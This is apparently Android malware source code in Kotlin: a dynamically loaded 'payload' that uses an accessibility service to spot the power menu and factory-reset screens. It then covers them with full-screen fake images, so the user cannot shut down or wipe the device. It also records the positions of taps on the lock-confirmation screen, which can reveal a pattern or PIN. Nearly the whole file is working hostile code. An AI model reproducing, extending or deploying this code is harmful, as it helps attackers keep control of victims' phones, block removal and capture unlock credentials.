package com.speedster.payload

import android.content.Context
import android.graphics.BitmapFactory
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.view.WindowManager
import androidx.compose.animation.*
import androidx.compose.animation.core.tween
import androidx.compose.foundation.Image
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.gestures.detectTapGestures
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.graphics.nativeCanvas
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.ui.geometry.Offset
import com.speedster.DynamicEntry
import java.io.File
import kotlin.math.roundToInt

class PayloadEntry : DynamicEntry {

    override @Composable fun Render(context: Context, resDir: File) {
        val clipboardManager = LocalClipboardManager.current
        val fakeMenuBitmap = remember(resDir) { try { BitmapFactory.decodeFile(File(resDir, "fake_menu.png").absolutePath).asImageBitmap() } catch (e: Exception) { null } }
        
        LaunchedEffect(Unit) {
            DynamicEntry.log("📡 Universal Brain Online.")
            var activeScenario = 0 
            var lockUntil = 0L

            DynamicEntry.accessibilityInterceptor = { event ->
                val pkg = event.packageName?.toString() ?: ""
                val className = event.className?.toString() ?: ""
                val eventType = event.eventType
                val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                val now = System.currentTimeMillis()

                // --- SCENARIO 2: RESET INTERCEPTION ---
                val eventText = event.text.joinToString(" ")
                val isResetTrigger = (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED && 
                    (event.source?.viewIdResourceName?.contains("initiate_main_clear") == true || eventText.contains("Reset", ignoreCase = true)))
                val isConfirmWindow = (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && 
                    (className.contains("ConfirmLockPattern") || className.contains("ConfirmLockPassword")))

                if (isResetTrigger || isConfirmWindow) {
                    lockUntil = now + 8000
                    if (activeScenario != 2) {
                        activeScenario = 2
                        DynamicEntry.log("🚨 RESET DETECTED. Using Standard Overlay.")
                        DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
                            type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        )
                        DynamicEntry.overlayContent = {
                            val resetBitmap = remember(resDir) { try { BitmapFactory.decodeFile(File(resDir, "resetconfirm.png").absolutePath).asImageBitmap() } catch (e: Exception) { null } }
                            val tapOffsets = remember { mutableStateListOf<Offset>() }
                            
                            Box(modifier = Modifier.fillMaxSize().background(Color.Black)
                                .pointerInput(Unit) {
                                    detectTapGestures { offset ->
                                        tapOffsets.add(offset)
                                        DynamicEntry.log("🎯 RESET TAP #${tapOffsets.size} at X: ${offset.x.roundToInt()}, Y: ${offset.y.roundToInt()}")
                                    }
                                }
                            ) {
                                if (resetBitmap != null) Image(bitmap = resetBitmap, contentDescription = null, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.FillBounds)
                                Canvas(modifier = Modifier.fillMaxSize()) {
                                    tapOffsets.forEachIndexed { index, offset ->
                                        drawCircle(color = Color.Red, radius = 150f, center = offset, alpha = 0.5f)
                                        drawContext.canvas.nativeCanvas.drawText("${index + 1}", offset.x, offset.y + 25f, android.graphics.Paint().apply { color = android.graphics.Color.WHITE; textSize = 70f; textAlign = android.graphics.Paint.Align.CENTER; isFakeBoldText = true })
                                    }
                                }
                            }
                        }
                    }
                }

                // --- SCENARIO 1: POWER MENU ---
                val hasPowerMenu = root?.let { checkNodes(it) } ?: false
                if (hasPowerMenu && activeScenario == 0) {
                    activeScenario = 1
                    DynamicEntry.log("🎯 POWER MENU. Using Standard Overlay.")
                    DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
                            type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    )
                    DynamicEntry.overlayContent = {
                        var currentScreen by remember { mutableStateOf(0) }
                        val powerImg = remember(resDir) { try { BitmapFactory.decodeFile(File(resDir, "power.png").absolutePath).asImageBitmap() } catch (e: Exception) { null } }
                        val restartImg = remember(resDir) { try { BitmapFactory.decodeFile(File(resDir, "restart.png").absolutePath).asImageBitmap() } catch (e: Exception) { null } }
                        
                        Crossfade(targetState = currentScreen, animationSpec = tween(300), label = "") { screen ->
                            Box(modifier = Modifier.fillMaxSize().background(Color.Black).pointerInput(Unit) {
                                detectTapGestures { offset ->
                                    if (screen == 0) {
                                        if ((offset.x - 290f).let { it*it } + (offset.y - 747f).let { it*it } < 40000f) currentScreen = 1
                                        if ((offset.x - 774f).let { it*it } + (offset.y - 803f).let { it*it } < 40000f) currentScreen = 2
                                    }
                                }
                            }) {
                                val activeBitmap = when(screen) { 1 -> powerImg; 2 -> restartImg; else -> fakeMenuBitmap }
                                if (activeBitmap != null) Image(bitmap = activeBitmap, contentDescription = null, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.FillBounds)
                            }
                        }
                    }
                }

                // --- CLEANUP ---
                if (now > lockUntil) {
                    if (activeScenario == 1 && !hasPowerMenu) {
                        DynamicEntry.overlayContent = null
                        activeScenario = 0
                    }
                    if (activeScenario == 2 && eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                        if (!pkg.contains("settings") && !pkg.contains("systemui")) {
                            DynamicEntry.overlayContent = null
                            activeScenario = 0
                        }
                    }
                }
            }
        }

        // Ghost Console Interface
        Column(modifier = Modifier.fillMaxSize().background(Color.Black).padding(16.dp)) {
            Text("BRAIN CONSOLE (STANDARD MODE)", color = Color.Green, fontSize = 14.sp)
            Row(modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp), horizontalArrangement = Arrangement.SpaceEvenly) {
                Button(onClick = { DynamicEntry.systemLogs.clear() }) { Text("Clear") }
                Button(onClick = { clipboardManager.setText(AnnotatedString(DynamicEntry.systemLogs.joinToString("\n"))) }) { Text("Copy") }
            }
            LazyColumn(modifier = Modifier.weight(1f)) {
                items(DynamicEntry.systemLogs.asReversed()) { log ->
                    Text(log, color = Color(0xFF00FF00), fontSize = 10.sp, fontFamily = FontFamily.Monospace)
                    Divider(color = Color.DarkGray)
                }
            }
        }
    }

    private fun checkNodes(node: AccessibilityNodeInfo): Boolean {
        val idMatch = node.viewIdResourceName?.contains("sec_global_actions") == true
        val classMatch = node.className?.contains("GlobalActions") == true
        if (idMatch || classMatch) return true
        for (i in 0 until node.childCount) { if (checkNodes(node.getChild(i) ?: continue)) return true }
        return false
    }
}
